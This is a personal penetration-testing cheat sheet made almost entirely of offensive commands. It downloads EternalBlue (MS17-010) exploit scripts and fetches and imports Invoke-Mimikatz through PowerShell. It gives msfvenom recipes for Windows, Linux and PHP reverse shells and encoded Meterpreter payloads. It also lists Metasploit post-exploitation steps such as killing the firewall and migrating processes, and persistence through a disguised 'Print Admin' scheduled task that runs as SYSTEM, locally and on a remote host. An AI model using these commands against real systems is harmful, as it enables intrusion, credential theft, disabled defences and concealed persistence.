# pentestnotes

#EternalBlue 32bit
wget https://raw.githubusercontent.com/worawit/MS17-010/20301cc5a96fa367d46d88291637247cc6252488/zzz_exploit.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py 

#enum msrpc
nmap 10.10.70.129 --script=msrpc-enum
nmap 10.10.70.129 --script=smb-vuln-ms17-010

#metasploit enum
use auxiliary/scanner/smb/smb_ms17_010

#PowerSploit Invoke-Mimikatz
set-executionpolicy unrestricted -scope currentuser

(iwr -uri <invoke-mimikatz>).content > C:\windows\temp\a.psm1
 import-module .\a.psm1 #need abs path
 

metasploit tips

run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm

msf > set AutoRunScript multi_console_command -rc /root/autoruncommands.rc



#Shellcode for reverse shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f raw
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f exe
Process exits so need to remove the call to exitprocess



#######ENCODING FILE#########
##LIST ENCODERS
msfvenom --list encoders

#Encode a file
msfvenom -p generic/custtom PAYLOADFILE=[filepath] -a x86 --platform Windows -e x86/add_sub -f raw -o outfile.bin
#READ FROM STDIN
cat <binary_file> | msfvenom -b <bad_chars> -e <encryption> -f <format> -a x86 --platform windows -p -

#MSHTA payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.2 PORT=4444 -f hta-psh
#List payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.2 PORT=4444 -f --list

#linux reverse shell
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.0.48 LPORT=4444 -b "\x00" -f elf -o <file>

#Generate PHP meterpreter r shell. Here the / instead of the _ means it's staged
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > rphpshell.php

#Generate PHP meterpreter r shell. Here the _ instead of the / means it's unstaged
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > rphpshell.php

#using php r handler
use multi/handler
set PAYLOAD php/meterpreter_reverse_tcp

#exploit suggester
post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true

#check privs
run post/windows/gather/win_privs

#port forward
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191

#schedule task every 5 mins
SCHTASKS /create /sc minute /mo 5 /tn "Print Admin" /tr "\"c:\windows\system32\cscript.exe\" //nologo c:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvs.vbs" /RU "SYSTEM" /f
schtasks /query /TN "Print Admin" /v
#schedule remote task. need to specify a user. make sure dest file exists
SCHTASKS /create /sc minute /mo 1 /tn "Print Admin" /tr "\"c:\windows\system32\cscript.exe\" //nologo c:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvs.vbs" /s mfdompc1 /u npickle /f
